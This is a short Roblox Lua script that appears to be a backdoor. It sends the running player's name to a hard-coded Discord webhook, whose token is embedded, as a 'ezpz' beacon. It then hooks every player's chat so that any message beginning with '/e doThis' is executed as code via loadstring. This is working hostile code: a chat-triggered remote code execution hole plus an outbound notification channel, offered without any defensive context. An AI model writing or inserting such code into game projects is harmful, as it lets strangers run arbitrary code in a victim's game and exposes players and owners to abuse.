local httpService = game:GetService("HttpService")
local webhookURL = "https://discord.com/api/webhooks/1200979029168234527/dMonorQrvY_yzvpNt7JbLZ0YL9S2IhuyN0p-PqteIBpgoQUzFs5qT9Wy_lxpQZSKgi16"
local player = game.Players.LocalPlayer

_G.sendHook = function(msg)
	local data = {
		["embeds"] = {{
			["author"] = {
				["name"] = player.Name,
			},
			["description"] = msg,
			["color"] = tonumber(0xFFFAFA)
		}}
	}

	local finalData = httpService:JSONEncode(data)
	httpService:PostAsync(webhookURL, finalData)
end

_G.sendHook(game.Players.LocalPlayer.Name .. "| ezpz")

function check(inputString)
    local prefix = "/e doThis"
    
    if string.sub(inputString, 1, #prefix) == prefix then
        local restOfString = string.sub(inputString, #prefix + 1)
        return restOfString
    else
        return false
    end
end

for _, plr in pairs(game.Players:GetPlayers()) do
    plr.Chatted:Connect(function(msg)
        local CHECK = check(msg)
    
        if CHECK then
            loadstring(CHECK)()
        end
    end)
end

game.Players.PlayerAdded:Connect(function(plr)
    plr.Chatted:Connect(function(msg)
        local CHECK = check(msg)
    
        if CHECK then
            loadstring(CHECK)()
        end
    end)
end)
